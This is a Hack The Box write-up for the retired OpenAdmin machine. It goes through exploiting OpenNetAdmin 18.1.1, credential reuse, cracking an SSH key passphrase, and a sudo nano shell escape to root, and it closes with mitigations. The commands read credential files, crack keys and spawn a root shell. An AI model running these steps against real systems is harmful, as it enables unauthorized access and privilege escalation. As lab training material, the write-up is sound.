---
machine: OpenAdmin
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, opennetadmin, rce, credential-reuse, ssh-key, john, gtfobins]
---

# OpenAdmin — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

`/ona/` runs **OpenNetAdmin 18.1.1**, with a public RCE (Exploit-DB 47691). As `www-data` you read database credentials that are **reused** for the `jimmy` account. From `jimmy` you reach an internal site on `127.0.0.1:52846` whose code holds a hardcoded SHA-512 hash; logging in, the panel hands over **joanna's encrypted private key**. Crack the passphrase, and as `joanna` the `sudo` rule on `nano` gives root.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)  → "Apache2 Ubuntu Default Page"
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403
```

`/music`, `/artwork`, `/sierra` appear, and the login button on `/music` leads to **`/ona/`**.

## Access

1. **OpenNetAdmin 18.1.1**:

```bash
searchsploit OpenNetAdmin
searchsploit -m 47691
bash 47691.sh http://<IP>/ona/login.php
```

```text
www-data@openadmin:/opt/ona/www$
```

2. **Database credentials**:

```bash
cat /var/www/html/ona/local/config/database_settings.inc.php
```

3. **Reuse towards `jimmy`**: the `ona_sys` password also works as `jimmy`'s system password.

```bash
ssh jimmy@<IP>
```

4. **Internal site on 52846**: loopback only.

```bash
ss -tlnp | grep 52846
ls -l /var/www/internal
```

`jimmy` is in the `internal` group, so he can read the code. The panel's login compares `hash('sha512', $password)` with a fixed value: crack it with a dictionary or an online service.

```bash
curl -s -X POST http://127.0.0.1:52846/index.php \
  -d 'username=jimmy&password=<password>&login=Submit'
curl -s http://127.0.0.1:52846/main.php
```

`main.php` returns `joanna`'s **encrypted RSA private key**.

## Escalation

```bash
ssh2john joanna.key > joanna.hash
john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
ssh -i joanna.key joanna@<IP>
```

The panel itself hints at the passphrase ("ninja"): the variants with that word are in the dictionary.

Now as `joanna`:

```bash
id
# uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

```bash
sudo -l
# (ALL) NOPASSWD: /bin/nano /opt/priv
```

Classic GTFOBins escape with `nano`:

```text
sudo /bin/nano /opt/priv
^R  ^X
reset; sh 1>&0 2>&0
```

```text
root@openadmin:~#
```

## Pitfalls

- **OpenNetAdmin path**: the exploit needs `/ona/login.php`, not the web root.
- **Loopback service**: 52846 is invisible from outside; run `curl` on the box or through an SSH tunnel.
- **`internal` group**: without being `jimmy` you cannot read the internal site's code.
- **`nano`**: the escape goes through `^R` `^X` (read file, then execute); otherwise you only edit text.

## Lessons

- Reusing the database password as a system password is the bridge from web RCE to SSH.
- A hardcoded unsalted SHA-512 hash cracks like any other.
- `sudo` on an editor is root: `nano`, `vim`, `less` and friends escape.
- Mitigation: per-service credentials, `password_hash()` (bcrypt/argon2), and `sudo` restricted to binaries without a shell.
